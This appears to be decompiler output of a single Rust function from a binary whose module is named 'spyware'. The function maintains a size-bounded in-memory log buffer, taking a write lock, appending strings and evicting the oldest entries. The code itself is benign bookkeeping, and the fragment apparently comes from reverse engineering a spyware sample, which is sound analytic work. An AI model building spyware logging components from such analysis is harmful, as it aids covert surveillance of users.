
  int64_t spyware::logging::memory_logger::CircularMemoryLogs::write_log::h24aec65a22a6ad29(int32_t* arg1, int128_t* arg2)

{
    if (arg2[1] >= *(arg1 + 0x28))
        /* tailcall */
        return core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(arg2);
    
    int128_t var_48;
    std::sync::rwlock::RwLock$LT$T$GT$::write::h0b8adb0c1087dc7a(&var_48, arg1);
    int32_t* rax_1;
    char rdx;
    rax_1 = core::result::Result$LT$T$C$E$GT$::unwrap::h893dc0961babf8c6(&var_48);
    int64_t var_38 = arg2[1];
    var_48 = *arg2;
    alloc::vec::Vec$LT$T$C$A$GT$::push::h796f5763df20dff9(&rax_1[4], &var_48);
    
    if (spyware::logging::memory_logger::compute_used_chars::h6cad6d693caf9651(*(rax_1 + 0x18), 
        *(rax_1 + 0x20)) >= *(arg1 + 0x28))
    {
        int64_t i;
        
        do
        {
            alloc::vec::Vec$LT$T$C$A$GT$::remove::h6cb891fd1a2f8dea(&var_48, &rax_1[4], 0);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_48);
            i = spyware::logging::memory_logger::compute_used_chars::h6cad6d693caf9651(
                *(rax_1 + 0x18), *(rax_1 + 0x20));
        } while (i >= *(arg1 + 0x28));
    }
    
    return core::ptr::drop_in_place$LT$std..sync..rwlock..RwLockWriteGuard$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$$GT$::h5706396115e72401(rax_1, rdx & 1);
}
